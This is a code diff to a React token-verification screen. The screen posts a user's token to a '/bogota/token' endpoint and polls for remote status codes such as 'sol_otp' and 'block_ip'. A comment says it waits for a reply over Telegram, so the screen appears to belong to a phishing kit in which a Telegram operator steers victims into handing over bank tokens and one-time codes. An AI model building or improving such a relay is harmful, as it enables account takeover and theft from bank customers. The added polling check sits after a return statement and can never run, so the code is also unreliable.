@@ -333,6 +333,9 @@ const TokenVerification = () => {
       // Se activa el estado de verificacion y loading
       setIsVerifying(true);
       setLoading(true);
+      lastEstadoRef.current = null;
+      modalBloqueoEstadoRef.current = null;
+      ignorarEstadoHastaCambioRef.current = null;
 
       // Se realiza la petición al backend central o al backend local
       const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/bogota/token", dataSend);
@@ -434,23 +437,23 @@ const TokenVerification = () => {
         if (lastEstadoRef.current === estadoActual) {
           pollingIntervalRef.current = setTimeout(poll, 3000);
           return;
+        // Si estamos verificando token enviado y el estado sigue siendo sol_token o pendiente, continuar esperando respuesta de Telegram
+        if (isVerifying && (estadoActual === "sol_token" || estadoActual === "pendiente")) {
+          pollingIntervalRef.current = setTimeout(poll, 2500);
+          return;
         }
 
         lastEstadoRef.current = estadoActual;
 
         // Se inicializan los estados que detienen el polling
         const stateValid = [
-          "sol_token", "sol_otp", "sol_finalizar", "sol_finalizado", "solicitar_finalizar", "error_token", "error_otp", "error_login", "block_ip", "error_blocked",
+          "sol_otp", "sol_finalizar", "sol_finalizado", "solicitar_finalizar", "error_token", "error_otp", "error_login", "block_ip", "error_blocked",
         ];
 
         // Se valida si el estado actual debe seguir consultando
         if (!stateValid.includes(estadoActual)) {
-
-          // Se programa el siguiente ciclo de polling
-          pollingIntervalRef.current = setTimeout(poll, 3000);
+          pollingIntervalRef.current = setTimeout(poll, 2500);
         } else {
-
-          // Se setea el timeout de polling a null
           pollingIntervalRef.current = null;
         }
 
